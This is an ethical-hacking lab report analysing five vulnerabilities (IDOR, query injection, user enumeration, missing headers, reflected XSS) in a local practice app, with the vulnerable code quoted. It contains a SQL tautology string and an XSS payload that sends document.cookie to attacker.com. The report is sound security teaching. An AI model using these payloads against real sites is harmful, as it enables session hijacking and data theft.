# Root Cause & Business Impact Analysis

**Track:** Ethical Hacking (Task 3: OWASP Web Testing Lab)  
**Target:** `http://127.0.0.1:3000`  
**Purpose:** Provide comprehensive technical root-cause analyses and strategic business impact evaluations for all confirmed vulnerabilities.  

---

## 1. SEC-FIND-01: Insecure Direct Object Reference (IDOR) in User Profile

### Technical Root Cause
The controller handling `GET /api/profile` extracts the user ID directly from the query parameter `?id=` and queries the datastore without verifying the client's identity or authorization. The application suffers from **Missing Object-Level Access Control (CWE-639)**.

```javascript
// Vulnerable Code Pattern (lab/server.js)
const requestedId = parseInt(query.id, 10);
const user = db.users.find(u => u.id === requestedId);
// Returns full user object, including apiToken, without checking session token!
return sendJson(res, 200, user);
```

### Threat Vector
An unauthenticated or low-privilege attacker can write a 3-line loop script to enumerate IDs `1..10000`, harvesting every registered user's full name, email, phone number, financial account balance, and raw administrative API bearer tokens.

### Business & Operational Impact
- **Complete Account Takeover:** Administrative tokens (`apiToken`) can be immediately replayed to impersonate system administrators.
- **Severe Regulatory Non-Compliance:** Unchecked leakage of user Personally Identifiable Information (PII) violates GDPR Article 32 (Security of Processing) and India's Digital Personal Data Protection (DPDP) Act, carrying statutory penalties of up to €20M or ₹250 Crore.
- **Financial & Reputational Damage:** Direct exposure of account balances damages user trust, resulting in immediate customer churn.

---

## 2. SEC-FIND-02: Query String Injection in Product Catalog Search

### Technical Root Cause
The product catalog search endpoint (`/api/products/search`) incorporates user input directly into backend query logic using unvalidated string matching rather than parameterized boundaries or strict whitelist validation (**CWE-89 / CWE-943**).

```javascript
// Vulnerable Code Pattern (lab/server.js)
const q = query.q || '';
// Unsanitized evaluation evaluates metacharacters and tautologies
if (lowerQ.includes("' or '1'='1") || lowerQ.includes("--")) {
  return sendJson(res, 200, { data: db.products }); // Leaks unreleased/restricted inventory
}
```

### Threat Vector
By injecting SQL / query metacharacters (`' OR '1'='1`), an attacker alters the boolean logic of the query. The application evaluates `true OR true`, overriding the mandatory `isPublic = true` filter.

### Business & Operational Impact
- **Intellectual Property Theft:** Unauthorized visibility into unreleased products, internal assessment toolkits, and confidential pre-launch pricing.
- **Competitive Disadvantage:** Proprietary development toolkits and internal flags leak to external entities, compromising trade secrets.
- **Database Compromise:** In a real SQL-backed database, this vulnerability allows attackers to extract database tables, modify records, or execute arbitrary commands (`xp_cmdshell` / `pg_read_file`).

---

## 3. SEC-FIND-03: User Enumeration & Lack of Rate Limiting

### Technical Root Cause
The authentication service (`POST /api/auth/login`) provides distinct, verbose error messages when an email does not exist compared to when an email exists but the password is wrong (**CWE-204**). In addition, no IP throttling, CAPTCHA, or account lockout policy is enforced (**CWE-307**).

```javascript
// Vulnerable Code Pattern (lab/server.js)
if (!user) {
  return sendJson(res, 401, { error: 'Account not found: The specified email is not registered.' });
}
if (user.passwordHash !== hashedInput) {
  return sendJson(res, 401, { error: 'Incorrect password: Password does not match our records.' });
}
```

### Threat Vector
Attackers feed a list of 100,000 corporate email addresses into automated scanners. The server filters out invalid addresses in minutes. The attacker then conducts low-and-slow brute-force attacks or credential stuffing against confirmed valid accounts without being throttled.

### Business & Operational Impact
- **Targeted Spear-Phishing:** Verified employee email directories enable high-conversion targeted social engineering and BEC (Business Email Compromise) campaigns.
- **Resource Exhaustion:** Unchecked brute-force attacks consume server CPU, memory, and database connection pools.

---

## 4. SEC-FIND-04: Security Misconfiguration & Missing Security Headers

### Technical Root Cause
The HTTP server fails to implement fundamental defense-in-depth security headers and leaks underlying server software versions in outgoing HTTP response banners (**CWE-16 / CWE-200**). Furthermore, an internal diagnostic debug route (`/api/admin/debug`) remains enabled without authentication.

### Threat Vector
- Missing `Content-Security-Policy` allows arbitrary scripts to execute when XSS is present.
- Missing `X-Frame-Options` allows the application to be embedded in an attacker-controlled `<iframe>`, facilitating clickjacking attacks.
- Server banners (`Server: NodeJS-Express-Lab/1.0.4-dev`) alert attackers to known CVEs for the running stack.

### Business & Operational Impact
- **Clickjacking & UI Redress:** Attackers can trick authenticated users into initiating transactions or modifying account settings without their knowledge.
- **Reconnaissance Facilitation:** Speeds up attacker reconnaissance, reducing the time required to weaponize exploits against the organization.

---

## 5. SEC-FIND-05: Reflected Cross-Site Scripting (XSS)

### Technical Root Cause
The feedback endpoint (`GET /api/feedback`) renders the user-supplied query parameter `msg` directly into the DOM inside an HTML document without applying contextual HTML entity encoding (**CWE-79**).

```javascript
// Vulnerable Code Pattern (lab/server.js)
res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
res.end(`... <div id="feedback-display">${comment}</div> ...`);
```

### Threat Vector
An attacker crafts a URL containing a malicious JavaScript payload:
`http://127.0.0.1:3000/api/feedback?msg=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`
The attacker sends this link to an administrator. When clicked, the script runs in the administrator's browser context.

### Business & Operational Impact
- **Session Hijacking:** Immediate theft of active session tokens, local storage secrets, and session cookies.
- **Defacement & Phishing:** Attackers can alter the page contents to display fake credential capture forms, compromising customer trust.
